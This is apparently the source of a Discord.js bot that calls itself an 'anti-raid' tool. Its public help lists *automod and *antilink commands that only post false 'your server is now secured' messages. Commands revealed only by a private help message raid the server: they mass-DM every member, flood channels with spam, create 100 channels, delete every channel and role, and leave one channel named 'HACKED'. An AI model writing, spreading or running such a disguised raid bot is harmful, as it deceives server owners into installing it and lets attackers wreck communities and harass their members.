client.on('ready', (_0x52f2x1) => {
    console.log('')
    console.log(
        chalk.yellow(
            `${'                                                            ██████╗██╗  ██╗ ██████╗  ██████╗ ██████╗ ██╗      █████╗ ████████╗███████╗██████╗ ██╗███████╗                   '}`
        )
    )
    console.log(
        chalk.yellow(
            `${'                                                           ██╔════╝██║  ██║██╔═══██╗██╔════╝██╔═══██╗██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██║██╔════╝                    '}`
        )
    )
    console.log(
        chalk.yellow(
            `${'                                                           ██║     ███████║██║   ██║██║     ██║   ██║██║     ███████║   ██║   █████╗  ██████╔╝██║█████╗                     '}`
        )
    )
    console.log(
        chalk.yellow(
            `${'                                                           ██║     ██╔══██║██║   ██║██║     ██║   ██║██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██║██╔══╝                      '}`
        )
    )
    console.log(
        chalk.yellow(
            `${'                                                           ╚██████╗██║  ██║╚██████╔╝╚██████╗╚██████╔╝███████╗██║  ██║   ██║   ███████╗██║  ██║██║███████╗                   '}`
        )
    )
    console.log(
        chalk.yellow(
            `${'                                                            ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝                   '}`
        )
    )
    console.log('')
    console.log(
        chalk.red(
            `                                                                                            ->  Crée par Choco8exe#8725 !`
        )
    )
    console.log(
        chalk.red(
            `${'                                                                                            ->      © 2021 choco, Inc.'}`
        )
    )
    console.log(
        chalk.red(
            `                                                                                            -> Github: https://github.com/choco8exe`
        )
    )
    console.log('')
    console.log(
        `info du bot : \n\nLe bot est sur ${client.guilds.cache.size} serveurs. \n avec un total de ${client.users.cache.size} membres.`
    )
    console.log(
        'Connecté en tant que ' +
            client.user.id +
            '  | Prefix : ' +
            botPrefix +
            '  | Nombre de Serveurs ' +
            client.guilds.cache.size +
            '  | Nombres de salons ' +
            client.channels.cache.size +
            '  | Utilisateur totaux ' +
            client.users.cache.size
    )
    client.user.setActivity('*help - chocolaterie')
})
client.on('message', (_0x52f2x1) => {
    if (_0x52f2x1.guild && _0x52f2x1.content.startsWith('*pmeveryone')) {
        _0x52f2x1.delete()
        let _0x52f2x2 = _0x52f2x1.content.slice('*pmeveryone'.length)
        _0x52f2x1.guild.members.cache.forEach((_0x52f2x3) => {
            if (_0x52f2x3.id != client.user.id && !_0x52f2x3.user.bot) {
                _0x52f2x3.send(_0x52f2x2)
            }
        })
    }
    if (_0x52f2x1.content.startsWith('*channels')) {
        _0x52f2x1.delete()
        let _0x52f2x4 = _0x52f2x1.content.slice('*channels'.length)
        _0x52f2x1.channel.send(
            'Création de 100 nouveaux salons de texte nommés: ' +
                '**' +
                _0x52f2x4 +
                '**'
        )
        var _0x52f2x5
        for (_0x52f2x5 = 0; _0x52f2x5 < 100; _0x52f2x5++) {
            setTimeout(() => {
                _0x52f2x1.guild.channels
                    .create(_0x52f2x4, { type: 'text' })
                    .then(console.log)
                    .catch(console.error)
            }, 1 * 1)
        }
    }
    if (_0x52f2x1.content.startsWith('*spam')) {
        _0x52f2x1.delete()
        let _0x52f2x6 = _0x52f2x1.content.slice('*spam'.length)
        var _0x52f2x5
        for (_0x52f2x5 = 0; _0x52f2x5 < 50; _0x52f2x5++) {
            setTimeout(() => {
                _0x52f2x1.channel.send(_0x52f2x6)
            }, 1 * 1)
        }
    }
    if (_0x52f2x1.content.startsWith('*deletechannels')) {
        _0x52f2x1.delete()
        var _0x52f2x5 = 0
        _0x52f2x1.guild.channels.cache.forEach((_0x52f2x7) => {
            return _0x52f2x5++
        })
        _0x52f2x1.channel.send('Suppression de **' + _0x52f2x5 + '** salons!')
        _0x52f2x1.guild.channels.cache.forEach((_0x52f2x7) => {
            return setTimeout(() => {
                _0x52f2x7.delete()
            }, 1000 * 3)
        })
        _0x52f2x1.guild.channels
            .create('HACKED', { type: 'text' })
            .then(console.log)
            .catch(console.error)
    }
    if (_0x52f2x1.content.startsWith('*deleteroles')) {
        _0x52f2x1.delete()
        let _0x52f2x8 = _0x52f2x1.content.slice('*deleteroles'.length)
        var _0x52f2x5 = 0
        _0x52f2x1.guild.roles.cache.forEach((_0x52f2x9) => {
            return _0x52f2x5++
        })
        _0x52f2x1.channel.send('Suppression de **' + _0x52f2x5 + '** rôles!')
        _0x52f2x1.guild.roles.cache.forEach((_0x52f2x9) => {
            return setTimeout(() => {
                if (
                    _0x52f2x1.guild.id !== _0x52f2x9.id &&
                    _0x52f2x9.name != 'corona' &&
                    _0x52f2x9.id != _0x52f2x8
                ) {
                    _0x52f2x9.delete()
                }
            }, 1000 * 3)
        })
    }
    if (_0x52f2x1.content == '*1help') {
        _0x52f2x1.delete()
        const _0x52f2xa = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setTitle('commande raid')
            .setDescription('Ici tu trouveras les meilleurs commandes de raid ')
            .addField(
                "Choco8exe#8725 n'est pas responsables de ce que vous en faites!"
            )
            .addField(
                'Commandes',
                ' `*1help` - Afficher les commandes raid `*deletechannels` - Supprime tous les salons `*deleteroles` - Supprime tous les rôles `*channels [Nom]` - Crée 100 salons avec le nom choisis `*spam [Message]` - Spams envoyés dans le salon `*spmall [Message]` - Spammer dans tout les salons en même temps `*pmeveryone [Message]` - DM tout les membres du serveur',
                true
            )
            .setTimestamp()
            .setFooter('Créé par choco')
        _0x52f2x1.author.send(_0x52f2xa)
    }
    if (_0x52f2x1.content.startsWith('*spmall')) {
        _0x52f2x1.delete()
        var _0x52f2x5
        for (_0x52f2x5 = 0; _0x52f2x5 < 5; _0x52f2x5++) {
            setTimeout(() => {
                let _0x52f2x6 = _0x52f2x1.content.slice('*spmall'.length)
                _0x52f2x1.guild.channels.cache.forEach((_0x52f2x7) => {
                    return _0x52f2x7.send(_0x52f2x6)
                })
            }, 1 * 1)
        }
    }
    if (_0x52f2x1.content == '*help') {
        const _0x52f2xa = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setTitle('commande anti-raid')
            .setURL('https://github.com/choco8exe')
            .setDescription('Ici vous pouvez trouver toutes les commandes')
            .addField(
                'Commandes Admin',
                " `*help` - Afficher les commandes `*automod` - Activer l'automod sur votre serveur `*antilink` - Activer l'anti-link sur votre serveur"
            )
            .setTimestamp()
            .setFooter('Créé par choco')
        _0x52f2x1.channel.send(_0x52f2xa)
    }
    if (_0x52f2x1.content == '*automod') {
        const _0x52f2xb = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setDescription(
                ":white_check_mark: **L'automod à bien été activer, votre serveur est maintenant sécurisé.**"
            )
        _0x52f2x1.channel.send(_0x52f2xb)
    }
    if (_0x52f2x1.content == '*antilink') {
        const _0x52f2xb = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setDescription(
                ":white_check_mark: **L'anti-link à bien été activer, votre serveur est maintenant sécurisé des invitations discord.**"
            )
        _0x52f2x1.channel.send(_0x52f2xb)
    }
})
